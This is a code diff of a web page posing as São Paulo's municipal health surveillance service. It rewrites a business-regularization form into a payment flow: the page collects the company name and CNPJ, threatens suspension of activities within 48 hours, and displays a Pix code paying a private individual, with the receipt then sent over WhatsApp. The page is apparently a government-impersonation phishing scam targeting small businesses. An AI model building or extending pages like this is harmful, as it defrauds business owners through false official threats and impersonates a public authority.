@@ -577,7 +577,6 @@
 </head>
 
 <body>
-  <!-- GOV BAR -->
   <div class="gov-bar">
     <div class="container flex-between">
       <span class="gov-left">Prefeitura do Município de São Paulo</span>
@@ -588,7 +587,6 @@
     </div>
   </div>
 
-  <!-- DRAWER MOBILE -->
   <div class="drawer-overlay" id="drawerOverlay" onclick="closeDrawer()"></div>
   <aside class="drawer" id="drawer">
     <div class="drawer-top">
@@ -615,7 +613,6 @@
     </div>
   </aside>
 
-  <!-- HEADER -->
   <header>
     <div class="container header-grid">
       <a href="#inicio" class="brand">
@@ -650,7 +647,6 @@
     </div>
   </header>
 
-  <!-- HERO -->
   <section id="inicio" class="hero">
     <div class="container hero-content">
       <span class="hero-badge">● Monitoramento Online 2026</span>
@@ -681,7 +677,6 @@
     </div>
   </section>
 
-  <!-- STATUS -->
   <div class="container status-bar">
     <div class="status-grid">
       <div class="status-card">
@@ -703,59 +698,78 @@
     </div>
   </div>
 
-  <!-- REGULARIZE -->
   <section id="regularize" class="checklist-section">
     <div class="container">
       <div class="checklist-wrapper">
         <div class="checklist-intro">
-          <h2>Regularize seu Negócio</h2>
-          <p>Selecione seu tipo de estabelecimento abaixo. O sistema listará a documentação obrigatória. Marque o que você já possui e envie para nossa pré-análise via WhatsApp.</p>
-
+          <h2>Regularização e Análise Documental</h2>
+          <p>Preencha os dados do seu estabelecimento para verificar as pendências, emitir a taxa de análise e enviar seus documentos diretamente para nossos fiscais via WhatsApp.</p>
+          
           <div class="steps-box">
-            <h4><i class="fas fa-check-circle"></i> Benefícios da Legalização:</h4>
-            <ul>
-              <li><i class="fas fa-shield-alt"></i> Evita multas e fechamento.</li>
-              <li><i class="fas fa-thumbs-up"></i> Credibilidade com o cliente.</li>
-              <li><i class="fas fa-handshake"></i> Acesso a crédito e licitações.</li>
-            </ul>
+            <h4><i class="fas fa-info-circle" style="color: var(--gov-blue);"></i> Importante:</h4>
+            <p style="font-size: 0.95rem; color: #444; margin-bottom: 0;">
+              A <strong>Taxa de Análise de Pendências Documentais</strong> é fundamental para o andamento do seu processo. O descumprimento dos prazos de regularização e o não pagamento desta taxa sujeitam o estabelecimento a medidas administrativas, que podem incluir a suspensão preventiva das atividades em até 48 horas, conforme a legislação sanitária vigente.
+            </p>
           </div>
         </div>
 
         <div class="checklist-form-container">
           <form id="form-regularizacao">
-            <label style="font-weight: 800; display: block; margin-bottom: 5px;">Qual seu tipo de negócio?</label>
-            <select class="form-control" id="tipo_estab" required>
-              <option value="">Selecione...</option>
-              <option value="Alimentos (Restaurante/Bar)">Alimentos (Restaurante/Bar)</option>
-              <option value="Saúde (Clínica/Consultório)">Saúde (Clínica/Consultório)</option>
-              <option value="Beleza (Salão/Estética)">Beleza (Salão/Estética)</option>
-              <option value="Escola/Educação">Escola / Creche</option>
-              <option value="Indústria/Fábrica">Indústria / Fábrica</option>
+            <label style="font-weight: 800; display: block; margin-bottom: 5px;">Dados do Estabelecimento</label>
+            <input type="text" class="form-control" id="nome_empresa" placeholder="Nome Fantasia / Razão Social *" required />
+            <input type="text" class="form-control" id="cnpj_empresa" placeholder="CNPJ (Apenas números) *" required maxlength="14" />
+
+            <label style="font-weight: 800; display: block; margin-top: 15px; margin-bottom: 5px;">Ramo de Atividade *</label>
+            <select class="form-control" id="tipo_estab" required onchange="mostrarChecklist()">
+              <option value="" disabled selected>Selecione...</option>
+              <option value="Alimentos">Alimentos (Restaurante, Bar, Mercado)</option>
+              <option value="Saúde">Saúde (Clínica, Odonto, Farmácia)</option>
+              <option value="Beleza">Beleza (Salão, Estética, Barbearia)</option>
+              <option value="Outros">Outros / Indústria / Educação</option>
             </select>
 
-            <input type="text" class="form-control" id="nome_empresa" placeholder="Nome Fantasia da Empresa" required />
-
-            <p style="font-weight: 900; margin-top: 25px; color: var(--sp-red);">📄 Documentação Obrigatória (Checklist):</p>
-            <div class="docs-list">
-              <label class="doc-item"><input type="checkbox" id="doc_cnpj" /><i class="fas fa-file-invoice doc-icon"></i> CNPJ Ativo</label>
-              <label class="doc-item"><input type="checkbox" id="doc_alvara" /><i class="fas fa-building doc-icon"></i> Alvará de Funcionamento Prefeitura</label>
-              <label class="doc-item"><input type="checkbox" id="doc_cmvs" /><i class="fas fa-id-card doc-icon"></i> Licença Sanitária (CMVS)</label>
-              <label class="doc-item"><input type="checkbox" id="doc_social" /><i class="fas fa-file-contract doc-icon"></i> Contrato Social / MEI</label>
-              <label class="doc-item"><input type="checkbox" id="doc_resp" /><i class="fas fa-user-md doc-icon"></i> Responsável Técnico (Se exigido)</label>
-              <label class="doc-item"><input type="checkbox" id="doc_avcb" /><i class="fas fa-fire-extinguisher doc-icon"></i> AVCB Bombeiros (Incêndio)</label>
-              <label class="doc-item"><input type="checkbox" id="doc_pragas" /><i class="fas fa-bug doc-icon"></i> Controle de Pragas (Dedetização)</label>
-              <label class="doc-item"><input type="checkbox" id="doc_agua" /><i class="fas fa-tint doc-icon"></i> Limpeza Caixa D'Água (Certificado)</label>
-              <label class="doc-item"><input type="checkbox" id="doc_pops" /><i class="fas fa-book doc-icon"></i> Manual de Boas Práticas + POPs</label>
+            <div id="area-checklist" style="display: none;">
+              <p style="font-weight: 900; margin-top: 25px; color: var(--sp-red);">📄 Marque os documentos que você JÁ POSSUI:</p>
+              <div class="docs-list" id="lista-documentos">
+                </div>
             </div>
 
-            <button type="submit" class="btn-success"><i class="fab fa-whatsapp"></i> Enviar para Análise Técnica</button>
+            <button type="submit" class="btn-success" id="btn-gerar-taxa" style="display: none; background: var(--gov-blue); margin-top: 20px;">
+              <i class="fas fa-file-invoice-dollar"></i> Gerar Taxa de Análise
+            </button>
           </form>
+
+          <div id="area-pagamento" style="display: none; text-align: center;">
+            <h3 style="color: var(--success-color); margin-bottom: 10px;"><i class="fas fa-check-circle"></i> Análise Gerada</h3>
+            <p style="font-weight: 800; font-size: 1.1rem; margin-bottom: 20px;">Protocolo: <span id="num-protocolo" style="color: var(--sp-red);"></span></p>
+
+            <div style="background: #f8f9fa; border: 2px dashed #ccc; padding: 25px; border-radius: 12px; margin-bottom: 25px;">
+              <h4 style="color: var(--text-dark); margin-bottom: 10px;">Taxa de Análise Documental</h4>
+              <p style="font-size: 0.9rem; color: #555; margin-bottom: 20px;">Escaneie o QR Code abaixo com o aplicativo do seu banco ou utilize a opção Pix Copia e Cola para regularizar sua situação.</p>
+
+              <img src="imagens/qrcode.png" alt="QR Code Pix" style="width: 200px; height: 200px; margin: 0 auto 20px; border-radius: 8px; border: 1px solid #eee;" />
+
+              <label style="font-size: 0.85rem; font-weight: 800; display: block; margin-bottom: 5px; text-align: left;">Pix Copia e Cola:</label>
+              <div style="display: flex; gap: 8px;">
+                <input type="text" id="pix-copia-cola" value="00020126580014br.gov.bcb.pix0136299713b0-c73d-4649-98ca-bb73764cdfe25204000053039865802BR5925GILIARD DE OLIVEIRA SANTI60085500019962070503***6304D4E0" class="form-control" style="margin-bottom: 0; font-size: 0.8rem; padding: 12px;" readonly />
+                <button onclick="copiarPix()" style="background: var(--text-dark); color: #fff; border: none; padding: 0 20px; border-radius: 8px; cursor: pointer; transition: 0.3s;" title="Copiar código"><i class="fas fa-copy"></i></button>
+              </div>
+            </div>
+
+            <p style="font-size: 0.95rem; font-weight: 600; color: var(--sp-dark-red); margin-bottom: 20px;">
+              Após o pagamento, clique no botão abaixo para enviar o comprovante junto com seus dados via WhatsApp.
+            </p>
+
+            <button onclick="enviarWhatsAppComprovante()" class="btn-success">
+              <i class="fab fa-whatsapp"></i> Enviar Comprovante
+            </button>
+          </div>
+
         </div>
       </div>
     </div>
   </section>
 
-  <!-- AREAS -->
   <section class="areas-section">
     <div class="container">
       <div class="areas-header">
@@ -773,7 +787,6 @@
     </div>
   </section>
 
-  <!-- IMPACTO -->
   <section class="impact-section">
     <div class="container">
       <div class="impact-title">
@@ -789,7 +802,6 @@
     </div>
   </section>
 
-  <!-- NOTICIAS -->
   <section id="noticias" class="news-section">
     <div class="container">
       <div class="section-header"><h2>Destaques Operacionais</h2></div>
@@ -825,7 +837,6 @@
     </div>
   </section>
 
-  <!-- LEGISLACAO -->
   <section id="legislacao" class="laws-section">
     <div class="container">
       <div class="section-header"><h2>Legislação Sanitária</h2></div>
@@ -854,7 +865,6 @@
     </div>
   </section>
 
-  <!-- FORMULARIOS -->
   <section id="formularios" class="laws-section" style="border-top: none; background: #f9f9f9;">
     <div class="container">
       <div class="section-header"><h2>Formulários e Instruções</h2></div>
@@ -873,7 +883,6 @@
     </div>
   </section>
 
-  <!-- FAQ -->
   <section class="faq-section">
     <div class="container">
       <div class="section-header"><h2>Perguntas Frequentes</h2></div>
@@ -892,7 +901,6 @@
     </div>
   </section>
 
-  <!-- DENUNCIA -->
   <section id="contato" class="report-section">
     <div class="container">
       <div class="report-header">
@@ -963,7 +971,6 @@
     </div>
   </section>
 
-  <!-- FOOTER -->
   <footer>
     <div class="container">
       <div class="footer-grid">
@@ -990,7 +997,6 @@
     </div>
   </footer>
 
-  <!-- CHAT -->
   <div class="chat-widget-btn" onclick="toggleChat()"><i class="fas fa-comment-dots"></i></div>
   <div class="chat-interface" id="chat-interface">
     <div class="chat-header"><span>Assistente COVISA</span><i class="fas fa-times" onclick="toggleChat()" style="cursor:pointer;"></i></div>
@@ -1056,38 +1062,92 @@
     /* =============================== */
     function enviarWhatsApp(texto) {
       const url = "https://api.whatsapp.com/send?phone=5511920665012&text=" + encodeURIComponent(texto);
-      window.location.href = url;
+      window.open(url, '_blank'); // Abre em nova guia para não fechar o site
     }
 
     /* =============================== */
-    /* 4. CHECKLIST REGULARIZE         */
+    /* 4. LÓGICA DO REGULARIZE 2.0     */
     /* =============================== */
+    const docsComuns = `
+      <label class="doc-item"><input type="checkbox" class="doc-check" value="CNPJ Ativo" /><i class="fas fa-file-invoice doc-icon"></i> CNPJ Ativo</label>
+      <label class="doc-item"><input type="checkbox" class="doc-check" value="Contrato Social / MEI" /><i class="fas fa-file-contract doc-icon"></i> Contrato Social / MEI</label>
+      <label class="doc-item"><input type="checkbox" class="doc-check" value="Alvará de Funcionamento" /><i class="fas fa-building doc-icon"></i> Alvará de Prefeitura</label>
+      <label class="doc-item"><input type="checkbox" class="doc-check" value="AVCB Bombeiros" /><i class="fas fa-fire-extinguisher doc-icon"></i> AVCB (Bombeiros)</label>
+    `;
+
+    function mostrarChecklist() {
+      const tipo = document.getElementById('tipo_estab').value;
+      const listaDocs = document.getElementById('lista-documentos');
+      
+      if (!tipo) return;
+
+      let docsEspecificos = "";
+      if (tipo === "Alimentos") {
+        docsEspecificos = `
+          <label class="doc-item"><input type="checkbox" class="doc-check" value="Manual Boas Práticas" /><i class="fas fa-book doc-icon"></i> Manual de Boas Práticas</label>
+          <label class="doc-item"><input type="checkbox" class="doc-check" value="Controle de Pragas" /><i class="fas fa-bug doc-icon"></i> Controle de Pragas</label>
+          <label class="doc-item"><input type="checkbox" class="doc-check" value="Limpeza Caixa D'água" /><i class="fas fa-tint doc-icon"></i> Limpeza Caixa D'água</label>
+        `;
+      } else if (tipo === "Saúde") {
+        docsEspecificos = `
+          <label class="doc-item"><input type="checkbox" class="doc-check" value="Responsável Técnico" /><i class="fas fa-user-md doc-icon"></i> Responsável Técnico</label>
+          <label class="doc-item"><input type="checkbox" class="doc-check" value="PGRSS (Resíduos)" /><i class="fas fa-trash-alt doc-icon"></i> PGRSS (Resíduos)</label>
+        `;
+      } else if (tipo === "Beleza") {
+        docsEspecificos = `
+          <label class="doc-item"><input type="checkbox" class="doc-check" value="Certificado Autoclave" /><i class="fas fa-pump-medical doc-icon"></i> Controle de Esterilização</label>
+          <label class="doc-item"><input type="checkbox" class="doc-check" value="Controle de Pragas" /><i class="fas fa-bug doc-icon"></i> Controle de Pragas</label>
+        `;
+      }
+
+      listaDocs.innerHTML = docsComuns + docsEspecificos;
+      document.getElementById('area-checklist').style.display = 'block';
+      document.getElementById('btn-gerar-taxa').style.display = 'flex';
+    }
+
+    let dadosParaWhatsApp = "";
+
     document.getElementById('form-regularizacao').addEventListener('submit', (e) => {
       e.preventDefault();
-
+      
+      const nome = document.getElementById('nome_empresa').value;
+      const cnpj = document.getElementById('cnpj_empresa').value;
       const tipo = document.getElementById('tipo_estab').value;
-      const empresa = document.getElementById('nome_empresa').value;
+      
+      const marcados = [];
+      document.querySelectorAll('.doc-check:checked').forEach(el => marcados.push(el.value));
+      const docsText = marcados.length > 0 ? marcados.join(", ") : "Nenhum documento marcado";
 
-      const check = (id) => document.getElementById(id).checked ? "SIM" : "NAO";
+      // Gera um protocolo único
+      const protocolo = "DIA-" + Math.floor(1000 + Math.random() * 9000) + "-" + new Date().getFullYear();
+      document.getElementById('num-protocolo').innerText = protocolo;
 
-      const msg =
-        "ANALISE DOCUMENTAL - VIGILANCIA\n\n" +
-        "EMPRESA: " + empresa + "\n" +
-        "TIPO: " + tipo + "\n\n" +
-        "CHECKLIST:\n" +
-        "CNPJ: " + check('doc_cnpj') + "\n" +
-        "ALVARA: " + check('doc_alvara') + "\n" +
-        "CMVS: " + check('doc_cmvs') + "\n" +
-        "CONTRATO/MEI: " + check('doc_social') + "\n" +
-        "RESP TEC: " + check('doc_resp') + "\n" +
-        "AVCB: " + check('doc_avcb') + "\n" +
-        "DEDETIZACAO: " + check('doc_pragas') + "\n" +
-        "CAIXA DAGUA: " + check('doc_agua') + "\n" +
-        "POPS/MANUAL: " + check('doc_pops') + "\n\n" +
-        "SOLICITO ANALISE E ORIENTACAO.";
+      // Monta a mensagem que será enviada
+      dadosParaWhatsApp = 
+        "*REGULARIZAÇÃO - ANÁLISE DOCUMENTAL*\n\n" +
+        "*Protocolo:* " + protocolo + "\n" +
+        "*Empresa:* " + nome + "\n" +
+        "*CNPJ:* " + cnpj + "\n" +
+        "*Ramo:* " + tipo + "\n" +
+        "*Documentos que já possui:* " + docsText + "\n\n" +
+        "Realizei o pagamento da Taxa de Análise de Pendências. *Segue o comprovante!*";
 
-      enviarWhatsApp(msg);
+      // Esconde o formulário e mostra a tela de pagamento
+      document.getElementById('form-regularizacao').style.display = 'none';
+      document.getElementById('area-pagamento').style.display = 'block';
     });
+
+    function copiarPix() {
+      const pixInput = document.getElementById('pix-copia-cola');
+      pixInput.select();
+      pixInput.setSelectionRange(0, 99999); // Para mobile
+      navigator.clipboard.writeText(pixInput.value);
+      alert("Código Pix copiado com sucesso!");
+    }
+
+    function enviarWhatsAppComprovante() {
+      enviarWhatsApp(dadosParaWhatsApp);
+    }
 
     /* =============================== */
     /* 5. DENUNCIA                     */
